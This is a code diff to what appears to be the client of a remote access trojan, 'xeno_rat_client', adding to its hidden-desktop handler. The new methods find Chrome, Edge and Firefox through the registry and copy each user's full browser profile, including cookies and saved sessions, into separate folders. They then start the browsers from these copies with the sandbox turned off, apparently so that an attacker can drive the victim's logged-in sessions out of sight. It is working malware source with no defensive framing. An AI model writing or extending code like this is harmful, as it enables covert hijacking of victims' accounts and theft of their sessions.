@@ -6,6 +6,7 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using xeno_rat_client;
 
@@ -87,6 +88,219 @@ namespace Hidden_handler
                 }
             }
             return CreateProc(@"C:\Windows\explorer.exe");
+        }
+
+        public string getChromePath()
+        {
+
+            var path = Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
+            if (path != null)
+            {
+                var split = path.Split('\"');
+                path = split.Length >= 2 ? split[1] : null;
+            }
+            return path;
+        }
+
+        public string GetEdgePath()
+        {
+            string edgeRegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe";
+
+            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(edgeRegistryPath))
+            {
+                if (key != null)
+                {
+                    object edgePathObj = key.GetValue("");
+
+                    if (edgePathObj != null)
+                    {
+                        return edgePathObj.ToString();
+                    }
+                }
+            }
+
+            return null;
+        }
+        public string GetFirefoxPath()
+        {
+            string firefoxRegistryPath = @"SOFTWARE\Mozilla\Mozilla Firefox";
+
+            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(firefoxRegistryPath))
+            {
+                if (key != null)
+                {
+                    object firefoxPathObj = key.GetValue("CurrentVersion");
+
+                    if (firefoxPathObj != null)
+                    {
+                        string currentVersion = firefoxPathObj.ToString();
+                        string pathKey = $@"SOFTWARE\Mozilla\Mozilla Firefox\{currentVersion}\Main";
+
+                        using (RegistryKey pathSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(pathKey))
+                        {
+                            if (pathSubKey != null)
+                            {
+                                object pathValue = pathSubKey.GetValue("PathToExe");
+
+                                if (pathValue != null)
+                                {
+                                    return pathValue.ToString();
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            return null;
+        }
+        public bool StartChrome() 
+        {
+            string dataDir = @"C:\ChromeAutomationData";
+            string path = getChromePath();
+            if (path == null || !File.Exists(path)) 
+            {
+                return false;
+            }
+            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir="+dataDir);
+        }
+
+        public bool StartEdge()
+        {
+            string dataDir = @"C:\EdgeAutomationData";
+            string path = GetEdgePath();
+            if (path == null || !File.Exists(path))
+            {
+                return false;
+            }
+            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
+        }
+
+        public bool StartFirefox()
+        {
+            string dataDir = @"C:\FirefoxAutomationData";
+            string path = GetFirefoxPath();
+            if (path == null || !File.Exists(path))
+            {
+                return false;
+            }
+            return CreateProc("\"" + path + "\"" + " -no-remote -profile " + dataDir);
+        }
+
+        public async Task<bool> CloneChrome() 
+        {
+            try
+            {
+                string dataDir = @"C:\ChromeAutomationData";
+                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Google\Chrome\User Data";
+                await Task.Run(() => Directory.Delete(dataDir, true));
+                Directory.CreateDirectory(dataDir);
+                await CopyDirAsync(source, dataDir);
+                return true;
+                
+            }
+            catch { }
+            return false;
+        }
+
+        public async Task<bool> CloneFirefox()
+        {
+            try
+            {
+                string profilesPath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Mozilla\Firefox\Profiles";
+                string fileInDirectory = "addons.json";
+                string source=RecursiveFileSearch(profilesPath, fileInDirectory);
+                if (source == null) 
+                {
+                    return false;
+                }
+                string dataDir = @"C:\FirefoxAutomationData";
+                await Task.Run(() => Directory.Delete(dataDir, true));
+                Directory.CreateDirectory(dataDir);
+                await CopyDirAsync(source, dataDir);
+                return true;
+
+            }
+            catch { }
+            return false;
+        }
+
+        public async Task<bool> CloneEdge()
+        {
+            try
+            {
+                string dataDir = @"C:\EdgeAutomationData";
+                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Microsoft\Edge\User Data";
+                await Task.Run(()=>Directory.Delete(dataDir, true));
+                Directory.CreateDirectory(dataDir);
+                await CopyDirAsync(source, dataDir);
+                return true;
+
+            }
+            catch { }
+            return false;
+        }
+        static string RecursiveFileSearch(string currentDirectory, string targetFileName)
+        {
+            string targetFilePath = Path.Combine(currentDirectory, targetFileName);
+            if (File.Exists(targetFilePath))
+            {
+                return currentDirectory;
+            }
+            foreach (string subdirectory in Directory.GetDirectories(currentDirectory))
+            {
+                string result = RecursiveFileSearch(subdirectory, targetFileName);
+                if (result != null)
+                {
+                    return result;
+                }
+            }
+            return null;
+        }
+
+        public async Task CopyDirAsync(string sourceDir, string destinationDir)
+        {
+            await CopyDirectoriesAsync(sourceDir, destinationDir);
+
+            IEnumerable<string> files = Directory.EnumerateFiles(sourceDir, "*", SearchOption.AllDirectories);
+            await CopyFilesInParallelAsync(files, sourceDir, destinationDir, maxParallelism: 10); // Set your desired parallelism limit
+        }
+
+        private async Task CopyDirectoriesAsync(string sourceDir, string destinationDir)
+        {
+            IEnumerable<string> directories = Directory.EnumerateDirectories(sourceDir, "*", SearchOption.AllDirectories);
+
+            foreach (string dir in directories)
+            {
+                string relativePath = dir.Substring(sourceDir.Length + 1);
+                string destinationPath = Path.Combine(destinationDir, relativePath);
+
+                await Task.Run(() => Directory.CreateDirectory(destinationPath));
+            }
+        }
+
+        private static async Task CopyFilesInParallelAsync(IEnumerable<string> files, string sourceDir, string destinationDir, int maxParallelism)
+        {
+            var semaphore = new SemaphoreSlim(maxParallelism);
+
+            async Task CopyFileAsync(string filePath)
+            {
+                string relativePath = filePath.Substring(sourceDir.Length + 1);
+                string destinationPath = Path.Combine(destinationDir, relativePath);
+
+                try
+                {
+                    await semaphore.WaitAsync();
+                    await Task.Run(() => File.Copy(filePath, destinationPath, true));
+                }
+                finally
+                {
+                    semaphore.Release();
+                }
+            }
+
+            var copyTasks = files.Select(CopyFileAsync).ToArray();
+
+            await Task.WhenAll(copyTasks);
         }
 
         public bool CreateProc(string filePath)
